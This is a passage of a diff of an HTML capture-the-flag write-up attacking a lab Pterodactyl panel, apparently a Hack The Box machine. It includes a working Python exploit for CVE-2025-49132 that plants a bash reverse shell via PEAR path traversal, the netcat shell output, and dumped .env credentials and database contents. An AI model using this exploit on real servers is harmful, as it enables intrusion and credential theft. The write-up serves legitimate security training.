-</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Exploiting CVE-2025-49132 on </span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Sending payload...&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="ln">18</span><span class="cl">    
-</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
-</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
-</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Payload sent! Check your listener on </span><span class="si">{</span><span class="n">lhost</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">lport</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span><span class="p">:</span>
-</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Request timeout (expected if shell connected)&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[-] Error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="ln">26</span><span class="cl">
-</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
-</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
-</span></span><span class="line"><span class="ln">29</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Usage: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2"> &lt;target&gt; &lt;lhost&gt; &lt;lport&gt;&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-</span></span><span class="line"><span class="ln">31</span><span class="cl">    
-</span></span><span class="line"><span class="ln">32</span><span class="cl">    <span class="n">exploit</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span><span style="color:#f92672">from</span> urllib.parse <span style="color:#f92672">import</span> quote
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(target, lhost, lport):
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>    <span style="color:#75715e"># Payload: traverse to PEAR and inject PHP code through auto_prepend_file</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;../../../../../../../../usr/share/php/PEAR/pearcmd&amp;+config-create+/&amp;&lt;?=`bash -c &#39;bash -i &gt;&amp; /dev/tcp/</span><span style="color:#e6db74">{</span>lhost<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>lport<span style="color:#e6db74">}</span><span style="color:#e6db74"> 0&gt;&amp;1&#39;`?&gt;+/tmp/shell.php&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74">/locales/locale.json&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>    params <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>        <span style="color:#e6db74">&#34;locale&#34;</span>: payload,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>        <span style="color:#e6db74">&#34;namespace&#34;</span>: <span style="color:#e6db74">&#34;anything&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>    }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Exploiting CVE-2025-49132 on </span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Sending payload...&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url, params<span style="color:#f92672">=</span>params, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Payload sent! Check your listener on </span><span style="color:#e6db74">{</span>lhost<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>lport<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>    <span style="color:#66d9ef">except</span> requests<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>Timeout:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Request timeout (expected if shell connected)&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[-] Error: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span>    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">4</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Usage: </span><span style="color:#e6db74">{</span>sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74"> &lt;target&gt; &lt;lhost&gt; &lt;lport&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span><span>        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span><span>    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span><span>    exploit(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>], sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">3</span>])</span></span></code></pre></div></div>
 <p>The script constructed a payload that:<br>
 - Traversed to <code>/usr/share/php/PEAR/pearcmd.php</code><br>
 - Passed commands to PEAR&rsquo;s command handler using <code>&amp;+</code> separators<br>
 - Used <code>config-create</code> to write a PHP file containing a bash reverse shell<br>
 - The PHP code executed system commands to establish a connection back to my listener</p>
 <p>I set up a netcat listener and ran the exploit.</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln">1</span><span class="cl"><span class="gp">$</span> python3 exploit.py http://panel.pterodactyl.htb 10.10.15.120 <span class="m">4020</span>
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="go">[+] Exploiting CVE-2025-49132 on http://panel.pterodactyl.htb
-</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="go">[+] Sending payload...
-</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="go">[+] Payload sent! Check your listener on 10.10.15.120:4020
-</span></span></span></code></pre></div></div>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln">1</span><span class="cl"><span class="gp">$</span> nc -lvnp <span class="m">4020</span>
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="go">connect to [10.10.15.120] from (UNKNOWN) [10.129.4.8] 54104
-</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="go">bash: cannot set terminal process group (1211): Inappropriate ioctl for device
-</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="go">bash: no job control in this shell
-</span></span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="err">
-</span></span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="go">wwwrun@pterodactyl:/var/www/pterodactyl/public$ id
-</span></span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="go">uid=474(wwwrun) gid=477(www) groups=477(www)
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>$ python3 exploit.py http://panel.pterodactyl.htb 10.10.15.120 <span style="color:#ae81ff">4020</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>[+] Exploiting CVE-2025-49132 on http://panel.pterodactyl.htb
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>[+] Sending payload...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>[+] Payload sent! Check your listener on 10.10.15.120:4020
+</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>$ nc -lvnp <span style="color:#ae81ff">4020</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>connect to [10.10.15.120] from (UNKNOWN) [10.129.4.8] 54104
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>bash: cannot set terminal process group (1211): Inappropriate ioctl for device
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>wwwrun@pterodactyl:/var/www/pterodactyl/public$ id
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>uid=474(wwwrun) gid=477(www) groups=477(www)
+</span></span></code></pre></div></div>
 
 <h4 class="relative group">database enumeration
     <div id="database-enumeration" class="anchor"></div>
@@ -1257,39 +1257,39 @@
     
 </h4>
 <p>I navigated to the parent directory and checked the files:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln">1</span><span class="cl"><span class="go">wwwrun@pterodactyl:/var/www/pterodactyl/public$ cd ..
-</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="go">wwwrun@pterodactyl:/var/www/pterodactyl$ ls -la
-</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="go">total 284
-</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="go">drwxr-xr-x 13 wwwrun www   4096 Sep 16 17:15 .
-</span></span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="go">drwxr-xr-x  4 root   root  4096 Sep 16 17:14 ..
-</span></span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="go">-rw-r--r--  1 wwwrun www   1184 Sep 16 17:15 .env
-</span></span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="go">drwxr-xr-x  8 wwwrun www   4096 Sep 16 17:15 .git
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>wwwrun@pterodactyl:/var/www/pterodactyl/public$ cd ..
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>wwwrun@pterodactyl:/var/www/pterodactyl$ ls -la
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>total 284
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>drwxr-xr-x 13 wwwrun www   4096 Sep 16 17:15 .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>drwxr-xr-x  4 root   root  4096 Sep 16 17:14 ..
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>-rw-r--r--  1 wwwrun www   1184 Sep 16 17:15 .env
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>drwxr-xr-x  8 wwwrun www   4096 Sep 16 17:15 .git
+</span></span></code></pre></div></div>
 <p>The <code>.env</code> file contained database credentials <code>pterodactyl:PteraPanel</code></p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="go">wwwrun@pterodactyl:/var/www/pterodactyl$ cat .env
-</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="go">APP_ENV=production
-</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="go">APP_DEBUG=false
-</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="go">APP_KEY=base64:UaThTPQnUjrrK61o+Luk7P9o4hM+gl4UiMJqcbTSThY=
-</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="go">APP_TIMEZONE=UTC
-</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="err">
-</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="go">DB_CONNECTION=mysql
-</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="go">DB_HOST=127.0.0.1
-</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="go">DB_PORT=3306
-</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="go">DB_DATABASE=panel
-</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="go">DB_USERNAME=pterodactyl
-</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="go">DB_PASSWORD=PteraPanel
-</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="err">
-</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="go">REDIS_HOST=127.0.0.1
-</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="go">REDIS_PASSWORD=null
-</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="go">REDIS_PORT=6379
-</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="err">
-</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="go">CACHE_DRIVER=redis
-</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="go">QUEUE_CONNECTION=redis
-</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="go">SESSION_DRIVER=redis
-</span></span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="err">
-</span></span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="go">HASHIDS_SALT=pKkOnx0IzJvaUXKWt2PK
-</span></span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="go">HASHIDS_LENGTH=8
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>wwwrun@pterodactyl:/var/www/pterodactyl$ cat .env
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>APP_ENV=production
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>APP_DEBUG=false
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>APP_KEY=base64:UaThTPQnUjrrK61o+Luk7P9o4hM+gl4UiMJqcbTSThY=
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>APP_TIMEZONE=UTC
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>DB_CONNECTION=mysql
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>DB_HOST=127.0.0.1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>DB_PORT=3306
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>DB_DATABASE=panel
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>DB_USERNAME=pterodactyl
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>DB_PASSWORD=PteraPanel
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>REDIS_HOST=127.0.0.1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>REDIS_PASSWORD=null
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>REDIS_PORT=6379
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>CACHE_DRIVER=redis
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>QUEUE_CONNECTION=redis
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>SESSION_DRIVER=redis
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>HASHIDS_SALT=pKkOnx0IzJvaUXKWt2PK
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>HASHIDS_LENGTH=8
+</span></span></code></pre></div></div>
 
 <h4 class="relative group">user enumeratio
     <div id="user-enumeratio" class="anchor"></div>
@@ -1301,45 +1301,45 @@
     
 </h4>
 <p>I connected to the MariaDB database and queried the users table. The database contained two users with bcrypt hashes. The <code>headmonitor</code> account had <code>root_admin: 1</code>, granting full panel access, while <code>phileasfogg3</code> had <code>root_admin: 0</code>.</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="go">MariaDB [panel]&gt; select * from users \G;
-</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="go">*************************** 1. row ***************************
-</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="go">                   id: 2
-</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="go">          external_id: NULL
-</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="go">                 uuid: 5e6d956e-7be9-41ec-8016-45e434de8420
